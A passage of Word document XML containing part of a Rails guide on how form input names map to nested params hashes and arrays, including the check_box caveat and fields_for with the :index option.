                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {'address'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {'city'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'New York'}}}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3D1EB10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Normally Rails ignores duplicate parameter names. If the parameter name contains an empty set of square brackets [] then they will be accumulated in an array. If you wanted people to be able to input multiple phone numbers, you could place this in the form:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="288C8FDE" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D7953F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name="person[phone_number][]"</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type="text"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="129649E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name="person[phone_number][]"</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type="text"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A9EC8D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name="person[phone_number][]"</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type="text"/&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3377F95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This would result in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:person][:phone_number]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> being an array.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA623BA"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7.2 Combining Them</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB5603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We can mix and match these two concepts. For example, one element of a hash might be an array as in the previous example, or you can have an array of hashes. For example a form might let you create any number of addresses by repeating the following form fragment</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="22999BB8" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="453959C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name="addresses[][line1]"</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type="text"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4434FBE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name="addresses[][line2]"</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type="text"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FB1C9D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name="addresses[][city]"</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type="text"/&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79F7AE6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This would result in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:addresses]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> being an array of hashes with keys </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>line1</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>line2</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>city</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Rails decides to start accumulating values in a new hash whenever it encounters an input name that already exists in the current hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEB312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There’s a restriction, however, while hashes can be nested arbitrarily, only one level of “arrayness” is allowed. Arrays can be usually replaced by hashes, for example instead of having an array of model objects one can have a hash of model objects keyed by their id, an array index or some other parameter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C8E5B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Array parameters do not play well with the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>check_box</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper. According to the HTML specification unchecked checkboxes submit no value. However it is often convenient for a checkbox to always submit a value. The </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>check_box</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper fakes this by creating an auxiliary hidden input with the same name. If the checkbox is unchecked only the hidden input is submitted and if it is checked then both are submitted but the value submitted by the checkbox takes precedence. When working with array parameters this duplicate submission will confuse Rails since duplicate input names are how it decides when to start a new array element. It is preferable to either use </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>check_box_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or to use hashes instead of arrays.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602109FF"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7.3 Using Form Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E89732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previous sections did not use the Rails form helpers at all. While you can craft the input names yourself and pass them directly to helpers such as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text_field_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rails also provides higher level support. The two tools at your disposal here are the name parameter to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and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fields_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option that helpers take.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1347C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You might want to render a form with a set of edit fields for each of a person’s addresses. For example:</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59B1A1E7" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40B5888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form_for @person</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r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|person_form| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F43070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person_form.text_field :name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1971273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@person.addresses.each</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r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|address| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24F9CE4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person_form.fields_for address, :index</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; address do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|address_form|%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E6C6D1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address_form.text_field :city</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40A0D9C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75CF6E6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31CB275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0E9CFE9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Assuming the person had two addresses, with ids 23 and 45 this would create output similar to this:</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5C6CE36C" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37DF173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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/people/1"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>class="edit_person"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="edit_person_1"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="048A22E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id="person_name"</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name="person[name]"</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42689DF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id="person_address_23_city"</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name="person[address][23][city]"</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4280646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id="person_address_45_city"</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name="person[address][45][city]"</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5299415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&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="585D9C3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This will result in a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hash that looks like</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2364A9AF" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A3FF9F3" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="543294326"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{'person'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {'name'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Bob', 'address'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {'23'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {'city'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Paris'}, '45'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {'city'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'London'}}}}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67CE603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knows that all these inputs should be part of the person hash because you called </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fields_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the first form builder. By specifying an </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option you’re telling Rails that instead of naming the inputs </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>person[address][city]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it should insert that index surrounded by [] between the address and the city. If you pass an Active Record object as we did then Rails will call </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on it, which by default returns the database id. This is often useful as it is then easy to locate which Address record should be modified. You can pass numbers with some other significance, strings or even </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (which will result in an array parameter being created).</w:t>
      </w:r>
    </w:p>
